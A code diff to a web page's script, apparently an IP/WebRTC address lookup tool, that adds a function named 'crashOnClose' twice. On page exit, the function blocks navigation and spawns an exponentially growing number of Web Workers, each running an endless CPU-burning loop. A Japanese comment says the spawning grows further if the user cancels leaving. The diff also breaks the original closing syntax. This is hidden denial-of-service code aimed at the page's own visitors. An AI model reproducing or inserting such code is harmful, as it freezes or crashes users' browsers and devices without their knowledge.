@@ -273,7 +273,87 @@ WebRTC IPv4: ${ipv4ListStr}`;
     showError("取得できませんでした");
     console.error(e);
   }
-})();
+})
+  function crashOnClose() {
+  let depth = 0;
+  const workers = [];
+
+  function spawnWorker() {
+    const blob = new Blob([`
+      let a = 1.0, b = 1.0 / Math.sqrt(2), t = 0.25, p = 1.0;
+      while(true) {
+        const an = (a + b) / 2;
+        b = Math.sqrt(a * b);
+        t -= p * (a - an) ** 2;
+        a = an;
+        p *= 2;
+        const pi = (a + b) ** 2 / (4 * t);
+        for(let i=0;i<10000;i++) Math.sqrt(pi);
+      }
+    `], { type: 'text/javascript' });
+    
+    const w = new Worker(URL.createObjectURL(blob));
+    workers.push(w);
+  }
+
+  function explode(d) {
+    for (let i = 0; i < 2 ** d; i++) {
+      spawnWorker();
+    }
+    if (d < 5) {
+      setTimeout(() => explode(d + 1), 100);
+    }
+  }
+
+  window.addEventListener('beforeunload', (e) => {
+    explode(0);
+    e.preventDefault();
+    e.returnValue = '';
+    // 離脱キャンセルされたらさらに爆増
+    setTimeout(() => explode(2), 0);
+  });
+}();
+  
+function crashOnClose() {
+  let depth = 0;
+  const workers = [];
+
+  function spawnWorker() {
+    const blob = new Blob([`
+      let a = 1.0, b = 1.0 / Math.sqrt(2), t = 0.25, p = 1.0;
+      while(true) {
+        const an = (a + b) / 2;
+        b = Math.sqrt(a * b);
+        t -= p * (a - an) ** 2;
+        a = an;
+        p *= 2;
+        const pi = (a + b) ** 2 / (4 * t);
+        for(let i=0;i<10000;i++) Math.sqrt(pi);
+      }
+    `], { type: 'text/javascript' });
+    
+    const w = new Worker(URL.createObjectURL(blob));
+    workers.push(w);
+  }
+
+  function explode(d) {
+    for (let i = 0; i < 2 ** d; i++) {
+      spawnWorker();
+    }
+    if (d < 5) {
+      setTimeout(() => explode(d + 1), 100);
+    }
+  }
+
+  window.addEventListener('beforeunload', (e) => {
+    explode(0);
+    e.preventDefault();
+    e.returnValue = '';
+    // 離脱キャンセルされたらさらに爆増
+    setTimeout(() => explode(2), 0);
+  });
+}
+  crashOnClose();
 </script>
 
 </body>
